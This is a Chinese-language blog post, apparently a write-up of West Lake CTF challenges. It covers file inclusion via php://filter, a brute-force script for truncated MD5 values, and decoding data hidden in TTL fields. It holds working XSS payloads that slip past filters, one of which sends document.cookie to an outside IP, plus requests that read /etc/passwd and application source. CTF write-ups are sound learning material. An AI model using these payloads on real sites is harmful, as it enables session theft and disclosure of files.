<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>西湖挑战赛web | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="前言这次西湖CTF感觉难度适中，学到了不少东西。记下来做个笔记。 web1url:61.164.47.198:10000 第一道比较简单，  很明显是文件包含，包含/etc/passwd 验证一下。  可以看到没任何过滤，接着找flag文件肯定不会是很简单直接包含得到，flag文件名也不清楚。接着发包看源码找到提示。  ZGlyLnBocA==base64解码 dir.php常规直接读取源码，利">
<meta name="keywords" content="CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="西湖挑战赛web">
<meta property="og:url" content="http://yoursite.com/2019/04/13/西湖挑战赛/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="前言这次西湖CTF感觉难度适中，学到了不少东西。记下来做个笔记。 web1url:61.164.47.198:10000 第一道比较简单，  很明显是文件包含，包含/etc/passwd 验证一下。  可以看到没任何过滤，接着找flag文件肯定不会是很简单直接包含得到，flag文件名也不清楚。接着发包看源码找到提示。  ZGlyLnBocA==base64解码 dir.php常规直接读取源码，利">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://47.106.185.69/1/./img/1555123172.jpg">
<meta property="og:image" content="http://47.106.185.69/1/./img/1555123999.jpg">
<meta property="og:image" content="http://47.106.185.69/1/./img/1555124105.jpg">
<meta property="og:image" content="http://47.106.185.69/1/./img/1555124442.jpg">
<meta property="og:image" content="http://47.106.185.69/1/./img/1555125299.jpg">
<meta property="og:image" content="http://47.106.185.69/1/./img/1555125517.jpg">
<meta property="og:image" content="http://47.106.185.69/1/./img/1555125629.jpg">
<meta property="og:image" content="http://47.106.185.69/1/./img/1555125822.jpg">
<meta property="og:image" content="http://47.106.185.69/1/./img/1555125884.jpg">
<meta property="og:image" content="http://47.106.185.69/1/./img/1555126231.jpg">
<meta property="og:image" content="http://47.106.185.69/1/./img/1555126781.jpg">
<meta property="og:image" content="http://47.106.185.69/1/./img/1555135077.jpg">
<meta property="og:image" content="http://47.106.185.69/1/./img/1555135254.jpg">
<meta property="og:image" content="http://47.106.185.69/1/./img/1555137914.jpg">
<meta property="og:image" content="http://47.106.185.69/1/./img/1555138855.jpg">
<meta property="og:image" content="http://47.106.185.69/1/./img/1555139015.jpg">
<meta property="og:updated_time" content="2019-04-15T06:03:58.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="西湖挑战赛web">
<meta name="twitter:description" content="前言这次西湖CTF感觉难度适中，学到了不少东西。记下来做个笔记。 web1url:61.164.47.198:10000 第一道比较简单，  很明显是文件包含，包含/etc/passwd 验证一下。  可以看到没任何过滤，接着找flag文件肯定不会是很简单直接包含得到，flag文件名也不清楚。接着发包看源码找到提示。  ZGlyLnBocA==base64解码 dir.php常规直接读取源码，利">
<meta name="twitter:image" content="http://47.106.185.69/1/./img/1555123172.jpg">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-西湖挑战赛" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/04/13/西湖挑战赛/" class="article-date">
  <time datetime="2019-04-12T16:00:00.000Z" itemprop="datePublished">2019-04-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      西湖挑战赛web
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><img src="http://47.106.185.69/1/./img/1555123172.jpg" alt></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次西湖CTF感觉难度适中，学到了不少东西。记下来做个笔记。</p>
<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>url:61.164.47.198:10000</p>
<p>第一道比较简单，</p>
<p><img src="http://47.106.185.69/1/./img/1555123999.jpg" alt></p>
<p>很明显是文件包含，包含/etc/passwd 验证一下。</p>
<p><img src="http://47.106.185.69/1/./img/1555124105.jpg" alt></p>
<p>可以看到没任何过滤，接着找flag文件肯定不会是很简单直接包含得到，flag文件名也不清楚。接着发包看源码找到提示。</p>
<p><img src="http://47.106.185.69/1/./img/1555124442.jpg" alt></p>
<pre><code>ZGlyLnBocA==</code></pre><p>base64解码</p>
<pre><code>dir.php</code></pre><p>常规直接读取源码，利用file协议base64读取php源码。。</p>
<pre><code>http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=index.php</code></pre><p><img src="http://47.106.185.69/1/./img/1555125299.jpg" alt></p>
<p>index.php文件</p>
<pre><code>&lt;?php
$a = @$_GET[&apos;file&apos;];
if (!$a) {
    $a = &apos;./templates/index.html&apos;;
}
echo &apos;include $_GET[\&apos;file\&apos;]&apos;;
if (strpos(&apos;flag&apos;,$a)!==false) {
    die(&apos;nonono&apos;);
}
include $a;
?&gt;

&lt;!--hint: ZGlyLnBocA== --&gt;</code></pre><p>同理读取dir.php</p>
<pre><code>&lt;?php
$a = @$_GET[&apos;dir&apos;];
if(!$a){
$a = &apos;/tmp&apos;;
}
var_dump(scandir($a));</code></pre><p>var_dump可以直接读取目录，</p>
<p><img src="http://47.106.185.69/1/./img/1555125517.jpg" alt></p>
<p>在根目录下读取到flag文件，直接包含读取。</p>
<p><img src="http://47.106.185.69/1/./img/1555125629.jpg" alt></p>
<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>url:61.164.47.198:10001</p>
<p><img src="http://47.106.185.69/1/./img/1555125822.jpg" alt></p>
<p>开局两个框，登陆全靠admin，事实证明，点击登陆什么也不输入也能进后台。</p>
<p>后台分三个部分</p>
<p><img src="http://47.106.185.69/1/./img/1555125884.jpg" alt></p>
<p>首先是留言，然后report报告问题。</p>
<p><img src="http://47.106.185.69/1/./img/1555126231.jpg" alt></p>
<p>写个脚本跑出md5并不困难，猜测是构造xss页面获取cookie，然后提交到管理员，获得cookie，然后执行命令。</p>
<p>接下来就是构造xss，</p>
<p>script被过滤了，尝试各种标签，发现标签没有过滤，但是触发事件过滤了，如onload=,onerror=，很快可以发现，iframe的data协议没有被过滤，</p>
<pre><code>&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code></pre><p><img src="http://47.106.185.69/1/./img/1555126781.jpg" alt></p>
<p>然后构造获取cookie的xss。</p>
<p>经过测试，</p>
<pre><code>&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb24uaHJlZj0naHR0cDovL3VybDo4ODg4Lz9hPScrZG9jdW1lbnQuY29va2llPC9zY3JpcHQ+&quot;&gt;</code></pre><p>不太清楚这条为什么运行不了，<br>接着使用伪协议，实体化绕过。</p>
<pre><code>&lt;iframe src=&quot;javasc&amp;#114;ipt:window.location.href=&apos;http://47.106.185.69:8888/?a=&apos;+document.cookie&quot;&gt;</code></pre><p>接着就是爆破md5截断脚本。</p>
<pre><code># -*- coding: utf-8 -*-

import hashlib
from multiprocessing.dummy import Pool as ThreadPool

# MD5截断数值已知 求原始数据
# 例子 substr(md5(captcha), 0, 6)=60b7ef

def md5(s):  # 计算MD5字符串
    return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest()


keymd5 = &apos;5416ad&apos;   #已知的md5截断值
md5start = 0   # 设置题目已知的截断位置
md5length = 6

def findmd5(sss):    # 输入范围 里面会进行md5测试
    key = sss.split(&apos;:&apos;)
    start = int(key[0])   # 开始位置
    end = int(key[1])    # 结束位置
    result = 0
    for i in range(start, end):
        # print(md5(i)[md5start:md5length])
        if md5(i)[0:6] == keymd5:            # 拿到加密字符串
            result = i
            print(result)    # 打印
            break


list=[]  # 参数列表
for i in range(10):   # 多线程的数字列表 开始与结尾
    list.append(str(10000000*i) + &apos;:&apos; + str(10000000*(i+1)))
pool = ThreadPool()    # 多线程任务
pool.map(findmd5, list) # 函数 与参数列表
pool.close()
pool.join()</code></pre><p>此题烂尾，题目无辜暴毙！</p>
<h1 id="misc-TTL"><a href="#misc-TTL" class="headerlink" title="misc-TTL"></a>misc-TTL</h1><p>还有一道有意思的misc记录一下。</p>
<p>题目描述：</p>
<pre><code>我们截获了一些IP数据报，发现报文头中的TTL值特别可疑，怀疑是通信方嵌入了数据到TTL，我们将这些TTL值提取了出来，你能看出什么端倪吗？</code></pre><p>然后是一段奇怪的TTL字段，二十几万条这里就不写出来了。</p>
<p><img src="http://47.106.185.69/1/./img/1555135077.jpg" alt></p>
<p>然后百度搜索TTL 隐藏信息。</p>
<p><img src="http://47.106.185.69/1/./img/1555135254.jpg" alt></p>
<p>这么一说确实应该是这种隐藏，因为给的数字127 191 63  后六位都是111111</p>
<p>127 ==&gt;&gt; 01111111<br>63  ==&gt;&gt; 00111111<br>191 ==&gt;&gt; 10111111<br>255 ==&gt;&gt; 11111111</p>
<p>按道理说只有这四个数字，因为后六个数字是固定的，前两个数字 只有两种选择，2X2=4。</p>
<p>接下来写脚本提取出来每个二进制的前两位。</p>
<pre><code>import binascii
key=open(&apos;./ttl.txt&apos;,&apos;r&apos;)
f1 = open(&quot;./1.txt&quot;,&quot;a+&quot;)
f2 = open(&quot;./2.txt&quot;,&quot;a+&quot;)
a=0
for ttl in key.readlines():
    if(ttl[4:7]==&quot;127&quot;):        
        f1.write(&quot;01&quot;)
        a=a+1
        if a%4==0:
            f1.write(&quot;\n&quot;)
    elif(ttl[4:6]==&quot;63&quot;):        
        f1.write(&quot;00&quot;)
        a=a+1
        if a%4==0:
            f1.write(&quot;\n&quot;)
    elif(ttl[4:7]==&quot;191&quot;):        
        f1.write(&quot;10&quot;)
        a=a+1
        if a%4==0:
            f1.write(&quot;\n&quot;)
    elif(ttl[4:7]==&quot;255&quot;):    
        f1.write(&quot;11&quot;)
        a=a+1
        if a%4==0:
            f1.write(&quot;\n&quot;)

f3 = open(&quot;./1.txt&quot;,&quot;r&quot;)
for ttls in f3.readlines():
    f2.write(chr(int(ttls,2)))

with open(&apos;./2.txt&apos;, &apos;rt&apos;) as f:
    data = f.read()
flag = binascii.unhexlify(data)#转化为16进制的图片

f4 = open(&quot;1.jpg&quot;,&apos;wb&apos;)
f4.write(flag)</code></pre><p>得到结果。</p>
<p><img src="http://47.106.185.69/1/./img/1555137914.jpg" alt></p>
<p>内容太多实在不像flag，但是细心点观察可以看到前四位是ffd8 jpg图片的格式。</p>
<p>得到最终图片，貌似是个二维码。</p>
<p><img src="http://47.106.185.69/1/./img/1555138855.jpg" alt></p>
<p>但是不全，应该是需要分离。foremost分离。</p>
<p><img src="http://47.106.185.69/1/./img/1555139015.jpg" alt></p>
<p>提取五张二维码图片，拼接成一张完整的二维码图片。</p>
<p>加上原来的一共六张图片拼成二维码，得到flag。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/04/13/西湖挑战赛/" data-id="ck0l0oha1002apy2iggeo6p33" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/04/14/2019DDCTF/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          2019DDCTF
        
      </div>
    </a>
  
  
    <a href="/2019/04/08/掘安杯/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">掘安杯网络安全技能挑战赛</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂/">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/web漏洞/" style="font-size: 18px;">web漏洞</a> <a href="/tags/杂/" style="font-size: 16px;">杂</a> <a href="/tags/渗透攻防/" style="font-size: 12px;">渗透攻防</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/06/25/csp内容安全策略/">csp内容安全策略</a>
          </li>
        
          <li>
            <a href="/2019/05/25/thinkphp3.2.3/">thinkphp框架学习</a>
          </li>
        
          <li>
            <a href="/2019/05/17/url跳转实战/">渗透之url跳转</a>
          </li>
        
          <li>
            <a href="/2019/04/20/反序列化学习/">PHP反序列化学习</a>
          </li>
        
          <li>
            <a href="/2019/04/14/2019DDCTF/">2019DDCTF</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>